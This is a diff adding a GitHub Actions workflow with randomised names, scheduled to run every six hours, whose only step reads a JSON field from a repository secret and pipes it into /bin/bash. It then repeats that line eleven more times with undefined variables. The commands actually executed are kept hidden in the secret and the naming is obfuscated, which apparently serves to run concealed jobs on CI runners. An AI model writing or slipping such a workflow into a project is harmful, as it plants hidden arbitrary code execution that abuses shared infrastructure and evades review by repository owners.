@@ -1,0 +1,30 @@
+name: yongqiynlb
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yongqiynlb
+        env:
+          ipfh959: ${{ secrets.ipfh959 }}
+        run: |
+          echo $ipfh959 | jq -r .vz2523 | /bin/bash
+          echo $qcfsi61732 | jq -r .hzj97584 | /bin/bash
+          echo $r7573 | jq -r .zwxq9 | /bin/bash
+          echo $wlwb169 | jq -r .dkcwc800 | /bin/bash
+          echo $tq8 | jq -r .swei4 | /bin/bash
+          echo $qk68043 | jq -r .vfyc51683 | /bin/bash
+          echo $huqmo16 | jq -r .qo01621 | /bin/bash
+          echo $zm5 | jq -r .eh07074 | /bin/bash
+          echo $qlfvi88658 | jq -r .ftnz5705 | /bin/bash
+          echo $eekv112 | jq -r .ax25 | /bin/bash
+          echo $y36 | jq -r .a6382 | /bin/bash
+          echo $z2 | jq -r .qp55809 | /bin/bash
+
